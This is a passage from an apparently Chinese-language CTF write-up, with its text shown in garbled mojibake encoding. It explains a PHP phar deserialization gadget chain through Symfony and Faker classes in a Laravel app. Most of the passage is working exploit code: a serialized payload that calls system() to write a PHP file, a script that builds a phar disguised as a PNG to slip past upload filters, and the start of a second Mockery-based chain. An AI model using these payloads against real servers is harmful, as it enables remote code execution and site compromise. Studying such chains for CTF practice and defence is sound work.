punctuation">&#123;</span>                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>OverflowException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Maximum retries of %d reached without finding a valid value'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€‰ç”¨è¿™ä¸ªç±»æ˜¯å› ä¸ºè¿™ä¸ª <code>__call</code> æ–¹æ³•ä¸­åŒ…å«äº†æ¸…æ™°å¯è§çš„ <code>call_user_func_array</code> å’Œ <code>call_user_func</code></p><p>å¯ä»¥å‘ç° <code>call_user_func</code> çš„å‚æ•° <code>$this-&gt;validator</code> æ˜¯å¯æ§çš„</p><p>è€Œå¦ä¸€ä¸ªå‚æ•° <code>$res</code> æ˜¯ä» <code>call_user_func_array</code> å‡½æ•°ä¸­è·å¾—çš„è¿”å›å€¼</p><p><code>call_user_func_array</code> çš„å‚æ•°ä¸­ï¼Œ<code>$this-&gt;generator</code> æ˜¯å¯æ§çš„</p><p>ä½†æˆ‘ä»¬æ— æ³•æ§åˆ¶ä»–çš„è¿”å›å€¼ï¼Œå³æ— æ³•æ§åˆ¶ <code>$res</code></p><p>å¦ä¸€ä¸ªå‚æ•° <code>$name</code> æ˜¯ä¸å¯æ§çš„ï¼Œä¸”å€¼ä¸º <code>addCollection</code></p><p>å¦å¤–æˆ‘ä»¬ä¸ºäº†è§¦å‘ä¸€æ¬¡ <code>call_user_func</code>ï¼Œè¿™é‡Œé€‰æ‹©å°† <code>$this-&gt;MaxRetries</code> ç½®ä¸º 1 å³å¯</p><p><img src="image-20210430163442769.png" alt="image-20210430163442769" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430163442769.png" class="lozad post-image"></p><h3 id="DefaultGenerator-ç±»"><a href="#DefaultGenerator-ç±»" class="headerlink" title="DefaultGenerator ç±»"></a>DefaultGenerator ç±»</h3><p>æˆ‘ä»¬å†çœ‹åˆ° <code>Faker</code> ä¸­çš„ç±» <code>DefaultGenerator</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># vendor/fakephp/faker/src/Faker/DefaultGenerator.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span><span class="token comment">//...</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œçš„ <code>__call</code> æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªæˆ‘ä»¬å®Œå…¨å¯æ§çš„ <code>$this-&gt;default</code></p><p>äºæ˜¯åˆ°è¿™é‡Œï¼Œ<code>ValidGenerator</code> ä¸­çš„ <code>$res</code> å‚æ•°å°±æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„äº†</p><h3 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h3><p>æ¢³ç†ä¸€ä¸‹è°ƒç”¨é“¾</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ImportConfigurator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">-></span><span class="token function">addCollection</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">route</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>OverflowException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Maximum retries of %d reached without finding a valid value'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1ã€é€šè¿‡ <code>ImportConfigurator</code> ç±»çš„ <code>__destruct</code> æ–¹æ³•è§¦å‘ <code>ValidGenerator</code> ç±»çš„ <code>__call</code> æ–¹æ³•</p><p>2ã€<code>ValidGenerator</code> ç±»çš„ <code>__call</code> æ–¹æ³•ä¸­çš„ <code>call_user_func_array</code> å‡½æ•°</p><p>3ã€è§¦å‘ <code>DefaultGenerator</code> ç±»çš„ <code>__call</code> æ–¹æ³•</p><p>4ã€<code>DefaultGenerator</code> ç±»çš„ <code>__call</code> æ–¹æ³•è¿”å›å€¼å®Œå…¨å¯æ§</p><p>5ã€<code>ValidGenerator</code> ç±»çš„ <code>__call</code> æ–¹æ³•ä¸­çš„ <code>call_user_func_array</code> å‡½æ•°è¿”å›å€¼ <code>$res</code> å¯æ§</p><p>6ã€<code>ValidGenerator</code> ç±»çš„ <code>__call</code> æ–¹æ³•ä¸­ <code>call_user_func</code> å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°éƒ½å¯æ§</p><p>æ¡ä»¶æ¢³ç†</p><ul><li><code>ImportConfigurator-&gt;parent</code> = <code>ValidGenerator ç±»</code></li><li><code>ValidGenerator-&gt;maxRetries</code> = <code>1</code></li><li><code>ValidGenerator-&gt;generator</code> = <code>DefaultGenerator ç±»</code></li><li><code>DefaultGenerator-&gt;default</code> = <code>[ä»»æ„å¯æ§å‡½æ•°å‚æ•°]</code></li><li><code>ValidGenerator-&gt;validator</code> = <code>[ä»»æ„å¯æ§å‡½æ•°åç§°]</code></li></ul><h3 id="phar-ååºåˆ—åŒ–"><a href="#phar-ååºåˆ—åŒ–" class="headerlink" title="phar ååºåˆ—åŒ–"></a>phar ååºåˆ—åŒ–</h3><p>phar ååºåˆ—åŒ–æ˜¯ BlackHat 2018 å…¬å¸ƒçš„ä¸€ç§ä¸éœ€è¦ <code>unserialize</code> å‡½æ•°å°±èƒ½è§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•</p><p>å› ä¸ºç™¾åº¦å‡ºæ¥çš„å¤åˆ¶æ¥å¤åˆ¶å»éƒ½æ˜¯é‚£å‡ ç¯‡æ–‡ç« ï¼Œè¿™é‡Œé™„ä¸€ä»½ <a href="https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf">BlackHat 2018 çš„è®²ä¹‰</a></p><p>PHAR æ–‡ä»¶æ˜¯ PHP Archieve çš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯ç±»ä¼¼äº Java çš„ JAR åŒ…çš„ä¸€ç§å‹ç¼©æ–‡ä»¶</p><p><img src="image-20210430120902.png" alt="image-20210430120902" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430120902.png" class="lozad post-image"></p><p>PHP åœ¨è¯»å– PHAR æ–‡ä»¶çš„æ—¶å€™ä¼šå¯¹ <code>.phar/.metadata.bin</code> ä¸­çš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># exp1.phar.tar.gz/.phar/.metadata.binO:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":1:&#123;s:72:" Symfony\Component\Routing\Loader\Configurator\ImportConfigurator parent";O:20:"Faker\ValidGenerator":3:&#123;s:12:" * generator";O:22:"Faker\DefaultGenerator":1:&#123;s:10:" * default";s:34:"echo "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>" > 1.php";&#125;s:12:" * validator";s:6:"system";s:13:" * maxRetries";i:1;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è€Œ <code>.phar/stub.php</code> æ˜¯ PHAR æ–‡ä»¶çš„ä¸€ä¸ªæ ‡å¿—ï¼Œå³ <code>__HALT_COMPILER(); ?&gt;</code></p><p><img src="image-20210430121227.png" alt="image-20210430121227" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430121227.png" class="lozad post-image"></p><p>PHP ä¸ä¼šç†ä¼šè¿™ä¸ªæ ‡å¿—å‰é¢æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä»–åªç®¡æŠŠè¿™ä¸ªæ ‡å¿—åé¢çš„éƒ¨åˆ†ä½œä¸º PHAR åŒ…æ¥è§£æ</p><p><code>test.txt</code> æ˜¯éšä¾¿ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œæ˜¯ä¸€ä¸ªä¸ºäº†å®Œæˆå‹ç¼©è€Œéšæ„æ„é€ çš„ä¸œè¥¿ï¼ŒPHAR ååºåˆ—åŒ–çš„é‡ç‚¹ä¹Ÿä¸åœ¨è¿™é‡Œ 2333</p><p>å› æ­¤åªè¦ PHP èƒ½ä»¥ <code>phar://</code> åè®®è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±è¾¾åˆ°äº†</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Routing<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>Configurator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">ImportConfigurator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$c1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token variable">$c1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">ValidGenerator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$generator</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$validator</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$maxRetries</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">generator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">maxRetries</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">validator</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exp1.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">convertToExecutable</span><span class="token punctuation">(</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">,</span> <span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">GZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Routing<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>Configurator<span class="token punctuation">\</span>ImportConfigurator</span><span class="token punctuation">(</span>        <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Faker<span class="token punctuation">\</span>ValidGenerator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'echo "&lt;?php phpinfo(); ?>" > 1.php'</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºä¸Šä¼ æ–‡ä»¶æœ‰å¯¹ stub å’Œ php çš„è¿‡æ»¤ï¼ŒåŠ ä¸€è¡Œè¯­å¥å‹ç¼©ä¸€ä¸‹å°±èƒ½è¿‡</p><p>å‹ç¼©åçš„æ–‡ä»¶å†…å®¹</p><p><img src="image-20210430121617.png" alt="image-20210430121617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210430121617.png" class="lozad post-image"></p><p>è¶³å¤ŸæŠ½è±¡äº†å§ 233</p><p>ç”Ÿæˆå‡ºæ¥çš„ <code>exp1.phar.tar.gz</code>ï¼Œæ”¹åä¸º <code>exp1.png</code></p><p><strong>P.S. å› ä¸º PHP 8 åœ¨é‡åˆ°å¼‚å¸¸çš„æ—¶å€™ä¼šä½œä¸ºé”™è¯¯å¤„ç†ï¼Œåœæ­¢æ‰§è¡Œä»£ç </strong></p><p><strong>æ‰€ä»¥å¦‚æœé¢˜ç›®ç¯å¢ƒæ˜¯ PHP 8 å¥½åƒæ˜¯æ‰“ä¸é€šçš„ (æˆ‘æ˜¯ Manjaro ç¥æ•™ï¼Œè¢«å‘äº†ä¸çŸ­æ—¶é—´ 2333)</strong></p><p><img src="image-20210429190751.png" alt="image-20210429190751" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190751.png" class="lozad post-image"></p><p>ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åè®¿é—®è·¯ç”± <code>/index.php/image?image=phar://./uploads/xxxxxxx.png</code></p><p><img src="image-20210429190759.png" alt="image-20210429190759" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190759.png" class="lozad post-image"></p><p><img src="image-20210429190813.png" alt="image-20210429190813" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190813.png" class="lozad post-image"></p><p>ä¼šè¿”å› 500 é”™è¯¯ï¼Œæˆ‘å¼€äº† Laravel DEBUG æ‰€ä»¥é¡µé¢ä¸Šæœ‰è¯¦ç»†ä¿¡æ¯</p><p>ä½†æ˜¯ phar ååºåˆ—åŒ–å·²ç»æ‰§è¡Œäº†ï¼Œæ‰€ä»¥ä¼šåœ¨ <code>public</code> ç›®å½•ç”Ÿæˆä¸€ä¸ª <code>1.php</code></p><p><img src="image-20210429190820.png" alt="image-20210429190820" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190820.png" class="lozad post-image"></p><p>è®¿é—® <code>/1.php</code> å³å¯</p><h3 id="å®˜æ–¹ç‰ˆæœ¬-EXP"><a href="#å®˜æ–¹ç‰ˆæœ¬-EXP" class="headerlink" title="å®˜æ–¹ç‰ˆæœ¬ EXP"></a>å®˜æ–¹ç‰ˆæœ¬ EXP</h3><p>å‚è€ƒäº† ZeddYu å¸ˆå‚…çš„æ¨æ–‡ã€‚</p><p>æœ¬åœ°ç¯å¢ƒå’Œ Buu è¿œç¨‹ç¯å¢ƒä¸å¤ªä¸€æ ·ï¼Œæˆ‘çš„ EXP å¥½åƒæ²¡æ‰“é€šï¼Œå®˜æ–¹è§£ç”¨äº†å¦ä¸€æ¡é“¾ã€‚</p><p>æœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥è·Ÿä¸€ä¸‹è¿™æ¡é“¾ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BroadcastEvent</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BroadcastEvent</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Support</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MessageBag</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$messages</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$inner</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token variable">$inner</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span>    <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockDefinition</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$evilCode</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MockConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token 